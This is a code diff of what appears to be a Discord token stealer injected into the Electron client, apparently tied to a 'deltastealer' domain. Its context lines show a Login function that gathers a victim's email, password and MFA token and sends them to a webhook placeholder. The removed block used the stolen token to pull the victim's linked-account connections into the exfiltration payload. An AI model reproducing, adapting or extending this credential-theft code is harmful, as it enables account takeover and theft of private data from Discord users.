@@ -5,7 +5,6 @@ const {
     session
 } = require('electron')
 const querystring = require('querystring');
-const axios = require('axios')
 const os = require('os')
 var webhook = "%WEBHOOK_LINK%";
 const computerName = os.hostname();
@@ -525,37 +524,6 @@ function Login(email, password, token) {
                             if (token.startsWith("mfa")) {
                                 params.embeds.push(mfaembed)
                             }
-
-                            axios
-                        .get(
-                          "https://discord.com/api/v9/users/@me/connections",
-                          {
-                            headers: {
-                              "Content-Type": "application/json",
-                              Authorization: token,
-                            },
-                          }
-                        )
-                        .then((conns) => {
-                          if (conns.data.length >= 1) {
-                            var culoembed = {
-                              color: 0x55B4B0,
-                              title: "Connections",
-                              fields: [],
-                            };
-                            conns.data.forEach((connection) => {
-                              var lavergadejuan = "no";
-                              culoembed.fields.push({
-                                name: `${connection.type} ${
-                                  connection.type
-                                }`,
-                                value: `\`Username:\` ${connection.name}\n\`ID:\` ${connection.id}\n\`Access Token:\` **[Copy here](https://raw.deltastealer.gq/${lavergadejuan})**`,
-                                inline: true,
-                              });
-                            });
-                            params.embeds.push(culoembed);
-                          }
-                        })
 
                             SendToWebhook(JSON.stringify(params))
 
